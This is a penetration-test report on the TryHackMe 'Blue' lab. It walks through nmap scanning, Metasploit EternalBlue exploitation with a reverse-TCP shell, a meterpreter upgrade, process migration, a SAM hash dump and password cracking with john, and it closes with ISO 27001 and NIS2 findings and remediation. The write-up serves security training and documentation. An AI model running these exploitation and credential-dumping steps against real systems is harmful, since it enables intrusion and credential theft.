# Penetration-Test "Blue" - TryHackMe 

## 1. Managerial Summary

This test was conducted on a virtual environment in compliance with NIS2 Article 21 to showcase if security controls were implemented correctly.

Critical security risks were found within the tested system regarding outdated Server Message Block and Remote Desktop services. These vulnerabilities can lead to an attacker gaining full control in the form of the NT AUTHORITY\SYSTEM, gaining unlimited access to the whole system, including every file, process and even core functions of local Operating System.

Within a real network, this vulnerability could have significant negative impact on business operations due to stolen data being exfiltrated, as well as in regards to legal ramifications. After NIS2 Article 23, an exploitation of this vulnerability would be classified as 'severe' and would need to be reported to a CSIRT entity within 24 hours or otherwise risk high fines under NIS2 Article 34 Paragraphs 4 and 5 if this was a real business system and was exploited by an attacker.

## 2. Scope and Environment

The test was performed on the TryHackMe platform

- Attacking System: 10.112.107.24 (Ubuntu with preinstalled Kali tools)
- Target System: 10.112.140.209 (Windows x64)
  
Goals: 
- Perform reconnaissance
- Gain access, escalate privileges
- Find and extract files
- Crack hashed secrets within those files

## 3. Methodology

A black box environment was created with only the IP address of the target system known. 
The test itself follows roughly the Penetration Testing Execution Standard as far as this is possible within a virtual environment.

### 3.1 Reconnaissance
  - Using ICMP to confirm target being online
  - Using nmap to scan for open ports and vulnerabilities
### 3.2 Vulnerability Analysis
  - Discovering unpatched Windows vulnerabilities in form of MS17-010 and MS12-020
### 3.3 Exploitation
  - Using the Metasploit framework to gain initial access to the system
  - Leveraging MS17-010 to execute code remotely
### 3.4 Post-Exploitation
  - Escalating from Windows shell to Meterpreter shell and migrating to spoolsv.exe
  - Extraction of password hashes and offline cracking
### 3.5 Attack chain after MITRE ATT&CK
  - Active scanning for vulnerabilities [T1595.002](https://attack.mitre.org/techniques/T1595/002/)
  - Initial access by exploitation of remote services [T1210](https://attack.mitre.org/techniques/T1210/)
  - Privilege escalation [T1068](https://attack.mitre.org/techniques/T1068/)
  - Defense evasion by process injection [T1055](https://attack.mitre.org/techniques/T1055/)
  - Credential access by Security Account Manager (SAM) credential dumping  [T1003.002](https://attack.mitre.org/techniques/T1003/002/)
  - Credential access by brute force password cracking [T1110.002](https://attack.mitre.org/techniques/T1110/002/)
  - Discovery of files and directories (THM flags) [T1083](https://attack.mitre.org/techniques/T1083/)
  
## 4. Timeline

The engagement started with a ping command to ensure the target system was online

```
>_ ping 10.112.140.209
< 64 bytes from 10.112.140.209: icmp_seq=1 ttl=128 time=0.850 ms
```

The target system was confirmed to be active under the provided IP address.
Next a portscan with vulnerability script was performed to not only check for open ports, but also compare these ports with known and exploitable vulnerabilities

```
>_ nmap -sV --script vuln 10.112.140.209
```

The performed scan reveals open ports 135, 139, 445, 3389, 49152-54, 49160 and 49165. Within that scan, critical vulnerabilities in regards of port 445 and 3389 were detected

![ms12-020](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/000_Portscan_Vuln_1.png)

For port 3389 (Remote Desktop) vulnerability ms12-020, also known as CVE-2012-0002, was detected with a risk of 4.3 on DoS attacks and 9.3 for remote code execution attacks under CVSS scoring.

![ms17-010](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/001%20Portscan_Vuln_2.png)

For port 445 (Server Message Block) vulnerability ms17-010, also known as CVE-2017-0143 - 0148, was detected with a critical risk for remote code execution of 9.3 under CVSS 2.0 scoring.

Ms17-010 was chosen as attack vector with the Metasploit framework, that presented 29 modules for ms17-010 and 2 modules for ms12-020

```
>_ msfconsole
msf6>_ search ms17-010
< exploit/windows/smb/ms17_010_eternalblue
```

![Metasploit](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/003%20Metasploit.png)

```
msf6>_ use 0
<msf6 exploit(windows/smb/ms17_010_eternalblue
msf6>_ show options
msf6>_ set RHOSTS 10.112.140.209
msf6>_ show payloads ms17-010
msf6>_ set payload 56
>_ run
```

Module 0 (EternalBlue) was selected, target 10.112.140.209 was set and payload 56 (windows/x64/shell/reverse_tcp) was selected.

A previous attempt with payload 31, to start with a meterpreter shell from the beginning failed, which called for a windows shell and pivot to meterpreter after.

![Run_Exploit](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/004%20Run_Exploit.png)

An active session with the target system was established. The engagement continues with the establishment of a meterpreter shell from the attacking system to gain access to meterpreter commands.

```
msf6>_ use post/multi/manage/shell_to_meterpreter
msf6>_ show options
msf6>_ set SESSION 1
msf6>_ run
msf6>_ sessions
msf6>_ sessions -i 2
< username: NT AUTHORITY\SYSTEM
```

A second session, this time with a meterpreter shell, was created with NT AUTHORITY\SYSTEM privileges, as confirmed by the target system. 

In the next step, a migration from the currently unstable connection into a more stable process was performed to ensure fewer interruption during the attack.

```
meterpreter>_ ps
meterpreter>_ migrate 1304
meterpreter>_ hashdump
```

![Migration-hashdump](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/005%20Meterpreter_hashdump.png)

Migration was conducted into process 1304, spoolsv.exe to ensure a stable connection.

Following the migration, a hashdump was performed, revealing three password hashes, of which only one is not a default user. 

The hash of user 'Jon' (aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d) was cracked on the attacking machine.

```
>_ john jon.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

![John](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/006%20John.png)

The password for the user 'Jon' was identified as 'a******2' within a minute using rockyou.txt

Following this, other flags were discovered within the target system inside the C drive, simulating confidential files.

![flag1](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/007%20Lateral_Movement_Flag1.png)

![flag2-3](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/008%20Flag2_3.png)


## 5. Findings

### Finding 01:
- Critical Remote Code Execution under MS17-010 (EternalBlue)
- Severity: Critical (CVSS v2.0 Score: 9.3, CVSS v3.1: 8.8)
- Affected Port: 445 (TCP - Server Message Block)

Description:
The target system runs an old version of the Server Message Block (SMBv1) protocol without the MS17-010 security update. An attacker can gain access to the target system, execute code, escalate privileges to NT AUTHORITY\SYSTEM and gain full control over the target.

ISO 27001 Control Mapping:
- A.8.8 Management of Technical Vulnerabilities: The organization failed to obtain information about technical vulnerabilities and apply critical patches to the system.
- A.8.20 Network Security: The organization left an insecure and obsolete protocol (SMBv1) enabled on the network.

### Finding 02:
- Critical Remote Code Execution and DoS Risk under MS12-020
- Severity: Critical (CVSS v2.0 Score: 9.3 for RCE, 4.3 for DoS)
- Affected Port: 3389 (TCP - Remote Desktop Protocol)

Description:
The target system runs a service vulnerable to MS12-020. An attacker can exploit this vulnerability to cause a Denial of Service or execute remote code, compromising both the availability and integrity of the target system

ISO 27001 Control Mapping:
- A.8.8 Management of Technical Vulnerabilities: The organization failed to patch known vulnerabilities on remote access services.

## 6. Remediation Suggestions

To comply with ISO 27001 and NIS2 as outlined in section 1, the following actions are recommended to be performed immediately:

- Patch Management: Update the system to prevent exploitation of long known exploits.
- Recommendation to use SMBv3 or other solutions instead of the highly insecure SMBv1
- Ensure necessary updates to harden Remote Desktop and potentially restrict access to port 3389
- Enforce stricter password policy, both regarding length and complexity, but also check in with known leaked passwords
- If password policy can not be enforced, recommendation to implement MFA for system access
- Configure firewall to limit inbound SMB or RDP traffic only to authorized personnel
- Deploy IDS or IPS to detect, alert and prevent signatures that point to unusual SMBv1 traffic
- Ensure Network Layer Authentification is enabled for all RDP connections
